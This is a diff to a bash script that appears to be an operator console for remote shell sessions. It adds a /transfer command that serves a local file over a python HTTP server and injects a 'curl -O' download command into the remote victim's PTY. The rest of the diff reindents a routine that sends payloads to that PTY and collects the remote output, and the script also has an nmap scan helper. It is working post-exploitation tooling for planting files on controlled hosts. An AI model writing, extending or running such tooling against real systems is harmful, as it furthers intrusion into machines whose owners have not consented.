@@ -18,7 +18,51 @@ PER_READ_TIMEOUT=0.5
 OVERALL_TIMEOUT=5
 
 
+transfer(){
+	if [ -z "$1" ]; then
+		echo "Usage: /transfer <local_file_path>"
+		return 1
+	fi
+	local_file="$1"
+	SERVER_IP=$(ip route get 1.1.1.1 | awk '{print $7; exit}')
 
+	if [ ! -f "$local_file" ]; then
+		echo "File not found: $local_file"
+		return 1
+	fi
+
+	filename=$(basename "$local_file")
+	filedir=$(dirname "$local_file")
+
+	cd "$filedir" || return 1
+	python3 -m http.server 8181 --bind 0.0.0.0 > /tmp/lexicon_http_log.txt 2>&1 &
+	SERVER_PID=$!
+	echo "Started HTTP server with PID $SERVER_PID to serve $local_file"
+	sleep 2 # give server time to start
+
+	local payload="curl -O http://$SERVER_IP:8181/$filename"
+
+	if [ -z "${PTYPATH:-}" ] || [ ! -e "$PTYPATH" ]; then
+		echo "No PTYPATH selected or file doesn't exist."
+		kill "$SERVER_PID"
+		return 1
+	fi
+
+	# send payload to pty
+	printf '%s\n' "$payload" > "$PTYPATH"
+	# "Waiting for file transfer to complete..."
+	sleep 5
+	if grep -q "200" /tmp/lexicon_http_log.txt; then
+		echo "Found a 200 OK!. File transfer complete."
+	else
+			echo "No 200 OK detected (may still be successful)"
+	fi
+	kill "$SERVER_PID"
+	# rm /tmp/lexicon_http_log.txt
+
+
+
+}
 
 networkScan(){
 	if ! command -v nmap >/dev/null; then
@@ -75,10 +119,10 @@ clear_sessions() {
   done
 }
 send_and_collect(){
-        local payload="$1"
-        local per_read="$PER_READ_TIMEOUT"
-        local overall="$OVERALL_TIMEOUT"
-        local start now elapsed line
+	local payload="$1"
+	local per_read="$PER_READ_TIMEOUT"
+	local overall="$OVERALL_TIMEOUT"
+	local start now elapsed line
 
 	# printf '\003' > "$PTYPATH" # Ctrl+C
 
@@ -87,27 +131,27 @@ send_and_collect(){
 		return 1
 	fi
 
-        # send payload to pty
-        printf '%s\n' "$payload" > "$PTYPATH"
+	# send payload to pty
+	printf '%s\n' "$payload" > "$PTYPATH"
 
-        # collect output until no more arrives for per_read, or overall timeout reached
-        start=$(date +%s)
-        echo "--- begin remote output ---"
+	# collect output until no more arrives for per_read, or overall timeout reached
+	start=$(date +%s)
+	echo "--- begin remote output ---"
 
 
-        while true; do
-        	if read -r -t "$per_read" line < "$PTYPATH"; then
-                	printf 'REMOTE> %s\n' "$line"
-                        now=$(date +%s)
-			elapsed=$(( now - start ))
-			if (( elapsed >= overall )); then
-				break
+	while true; do
+		if read -r -t "$per_read" line < "$PTYPATH"; then
+				printf 'REMOTE> %s\n' "$line"
+					now=$(date +%s)
+		elapsed=$(( now - start ))
+		if (( elapsed >= overall )); then
+			break
+		fi
+		continue
+			else
+					break
 			fi
-			continue
-                else
-                        break
-                fi
-        done
+	done
 	echo "--- end remote output ---"
 
 }
@@ -225,6 +269,13 @@ while read -r cmd; do
 			;;
 		/script)
 			scripts
+			;;
+		/transfer\ *)
+			payload=${cmd#'/transfer '}
+			transfer "$payload"
+			;;
+		/transfer)
+			transfer
 			;;
 		/quit)
 			echo "bye"
